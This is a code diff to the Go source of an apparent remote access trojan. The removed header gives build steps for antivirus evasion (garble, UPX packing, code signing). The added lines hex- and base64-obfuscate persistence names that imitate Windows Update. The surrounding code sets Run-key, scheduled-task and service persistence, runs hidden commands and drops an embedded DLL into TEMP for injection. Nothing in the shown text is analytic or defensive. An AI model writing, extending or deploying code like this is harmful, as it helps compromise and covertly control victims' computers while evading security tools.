@@ -1,10 +1,3 @@
-// Build with obfuscation for AV evasion:
-// 1. Install garble: go install mvdan.cc/garble@latest
-// 2. Compile: garble -literals -seed=random -tiny build -ldflags="-s -w" -o rat.exe main.go
-// 3. Pack: upx --brute rat.exe
-// 4. Sign if possible: signtool sign /f cert.pfx rat.exe
-// This reduces detection by renaming symbols, encrypting literals, stripping debug, and compressing.
-
 package main
 
 import (
@@ -77,6 +70,13 @@ var (
 	obfInjectapc                                               = "0667474534307e426a2e760e"
 	obfInjectmanual                                            = "0667474534307e425121721157252143"
 	obfHollowprocess                                           = "06774b470c200941503e7e126a40314a1143535a"
+	obfPersistRegName                                          = "32023c60343f7a4052217a08"
+	obfWinUpdTask                                              = "31021e413420094150476213693521002862200b531c69066d56664f"
+	obfWinUpdShort                                             = "31021e413420094150476213693521002865535a"
+	obfDllDropPrefix                                           = "05683c5b34304805692e7e02"
+	obfWinUpdBat                                               = "31021e413420094150476213693521002862200b531c69066d5666073e5d3404"
+	obfSystemUpdateCron                                        = "04031e4e0a2066067f2e6213693521002865535a"
+	obfV3CopyPrefix                                            = "03021e410a3f72196a2e6608"
 	userLib, gdiLib, kernelLib                                 = shiftEncrypt("user32.dll"), shiftEncrypt("gdi32.dll"), shiftEncrypt("kernel32.dll")
 	getWindowProc, showWindowProc, getMetricsProc, getDCProc   = shiftEncrypt("GetConsoleWindow"), shiftEncrypt("ShowWindow"), shiftEncrypt("GetSystemMetrics"), shiftEncrypt("GetDC")
 	createDCProc, createBitmapProc, selectObjProc, bitCopyProc = shiftEncrypt("CreateCompatibleDC"), shiftEncrypt("CreateCompatibleBitmap"), shiftEncrypt("SelectObject"), shiftEncrypt("BitBlt")
@@ -147,6 +147,14 @@ func deobfuscateString(hexStr string) string {
 	decoded, _ := base64.StdEncoding.DecodeString(b64Str)
 	return string(decoded)
 }
+
+func persistRegNameStr() string  { return deobfuscateString(obfPersistRegName) }
+func winUpdTaskName() string     { return deobfuscateString(obfWinUpdTask) }
+func winUpdShortName() string    { return deobfuscateString(obfWinUpdShort) }
+func dllDropPrefix() string      { return deobfuscateString(obfDllDropPrefix) }
+func winUpdBatName() string      { return deobfuscateString(obfWinUpdBat) }
+func systemUpdateCronTag() string { return deobfuscateString(obfSystemUpdateCron) }
+func v3CopyPrefix() string       { return deobfuscateString(obfV3CopyPrefix) }
 
 // API string hashing (djb2) for dynamic resolution evasion
 func hashString(s string) uint32 {
@@ -598,7 +606,6 @@ func getAppNames() []string {
 const (
 	// reg.exe accepts HKCU\... (same as HKEY_CURRENT_USER\...)
 	persistHKCURunKey = `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
-	persistRegName    = "ScService"
 )
 
 // regQueryValueOutput runs reg query and returns stdout (empty if missing).
@@ -621,7 +628,7 @@ func writeHKCUScServiceRun(target string) {
 	if strings.ContainsAny(target, " \t") {
 		regData = `"` + target + `"`
 	}
-	cmd := exec.Command("reg", "add", persistHKCURunKey, "/v", persistRegName, "/t", "REG_SZ", "/d", regData, "/f")
+	cmd := exec.Command("reg", "add", persistHKCURunKey, "/v", persistRegNameStr(), "/t", "REG_SZ", "/d", regData, "/f")
 	setHiddenWindow(cmd)
 	_ = cmd.Run()
 }
@@ -726,7 +733,7 @@ func isPersistenceSet(exePath string) bool {
 		if want == "" {
 			return false
 		}
-		if out := strings.ToLower(regQueryValueOutput(persistRegName)); out != "" && strings.Contains(out, want) {
+		if out := strings.ToLower(regQueryValueOutput(persistRegNameStr())); out != "" && strings.Contains(out, want) {
 			if st, err := os.Stat(want); err == nil && !st.IsDir() {
 				return true
 			}
@@ -828,22 +835,22 @@ func cleanLegacyWindowsPersistenceArtifacts() {
 	if runtime.GOOS != "windows" {
 		return
 	}
-	cmd := exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateService", "/f")
+	cmd := exec.Command("schtasks", "/delete", "/tn", winUpdTaskName(), "/f")
 	setHiddenWindow(cmd)
 	_ = cmd.Run()
 	// Legacy Run names from older builds (do not delete ScService — we use it now)
-	for _, v := range []string{"WindowsUpdateService", "WindowsUpdate"} {
+	for _, v := range []string{winUpdTaskName(), winUpdShortName()} {
 		cmd = exec.Command("reg", "delete", persistHKCURunKey, "/v", v, "/f")
 		setHiddenWindow(cmd)
 		_ = cmd.Run()
 	}
-	startupFile := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdateService.bat")
+	startupFile := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", winUpdBatName())
 	_ = os.Remove(startupFile)
-	cmd = exec.Command("sc", "stop", "WindowsUpdateService")
+	cmd = exec.Command("sc", "stop", winUpdTaskName())
 	setHiddenWindow(cmd)
 	_ = cmd.Run()
 	time.Sleep(400 * time.Millisecond)
-	cmd = exec.Command("sc", "delete", "WindowsUpdateService")
+	cmd = exec.Command("sc", "delete", winUpdTaskName())
 	setHiddenWindow(cmd)
 	_ = cmd.Run()
 }
@@ -851,18 +858,18 @@ func cleanLegacyWindowsPersistenceArtifacts() {
 // v3PersistedCopyFileName matches V3.go createSystemPersistence: sha256(abs path) -> winupdate + first 3 bytes hex + .exe
 func v3PersistedCopyFileName(absExe string) string {
 	h := sha256.Sum256([]byte(absExe))
-	return "winupdate" + hex.EncodeToString(h[:3]) + ".exe"
+	return v3CopyPrefix() + hex.EncodeToString(h[:3]) + ".exe"
 }
 
 func removePersistence() {
 	if runtime.GOOS == "windows" {
 		// Remove scheduled task
-		cmd := exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateService", "/f")
+		cmd := exec.Command("schtasks", "/delete", "/tn", winUpdTaskName(), "/f")
 		setHiddenWindow(cmd)
 		_ = cmd.Run()
 
 		// Remove registry entries (current + legacy)
-		for _, v := range []string{persistRegName, "WindowsUpdateService", "WindowsUpdate"} {
+		for _, v := range []string{persistRegNameStr(), winUpdTaskName(), winUpdShortName()} {
 			cmd = exec.Command("reg", "delete", persistHKCURunKey, "/v", v, "/f")
 			setHiddenWindow(cmd)
 			_ = cmd.Run()
@@ -870,15 +877,15 @@ func removePersistence() {
 
 		// Remove startup file
 		startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-		startupFile := filepath.Join(startupPath, "WindowsUpdateService.bat")
+		startupFile := filepath.Join(startupPath, winUpdBatName())
 		os.Remove(startupFile)
 
 		// Remove service
-		cmd = exec.Command("sc", "stop", "WindowsUpdateService")
+		cmd = exec.Command("sc", "stop", winUpdTaskName())
 		setHiddenWindow(cmd)
 		_ = cmd.Run()
 
-		cmd = exec.Command("sc", "delete", "WindowsUpdateService")
+		cmd = exec.Command("sc", "delete", winUpdTaskName())
 		setHiddenWindow(cmd)
 		_ = cmd.Run()
 	} else {
@@ -889,7 +896,7 @@ func removePersistence() {
 			lines := strings.Split(string(output), "\n")
 			var newLines []string
 			for _, line := range lines {
-				if !strings.Contains(line, "WindowsUpdateService") && !strings.Contains(line, "system-update") {
+				if !strings.Contains(line, winUpdTaskName()) && !strings.Contains(line, systemUpdateCronTag()) {
 					newLines = append(newLines, line)
 				}
 			}
@@ -2622,16 +2629,17 @@ func injectDLL(pidStr, dllPath string) string {
 
 // materializeEmbeddedDLL writes the build-embedded payload DLL to TEMP.
 func materializeEmbeddedDLL() (string, error) {
-	if len(embeddedInjectDLL) < 64 {
+	raw := embeddedInjectDLLBytes()
+	if len(raw) < 64 {
 		return "", fmt.Errorf("This EXE has no embedded inject DLL. Generate a fresh Windows build from the dashboard (DLL inject pack).")
 	}
 	// MZ check
-	if embeddedInjectDLL[0] != 'M' || embeddedInjectDLL[1] != 'Z' {
+	if raw[0] != 'M' || raw[1] != 'Z' {
 		return "", fmt.Errorf("Embedded inject DLL is corrupt")
 	}
-	name := fmt.Sprintf("mshelper_%d.dll", time.Now().UnixNano()%1e8)
+	name := fmt.Sprintf("%s%d.dll", dllDropPrefix(), time.Now().UnixNano()%1e8)
 	dst := filepath.Join(os.TempDir(), name)
-	if err := os.WriteFile(dst, embeddedInjectDLL, 0644); err != nil {
+	if err := os.WriteFile(dst, raw, 0644); err != nil {
 		return "", fmt.Errorf("Failed to drop inject DLL: %v", err)
 	}
 	return dst, nil
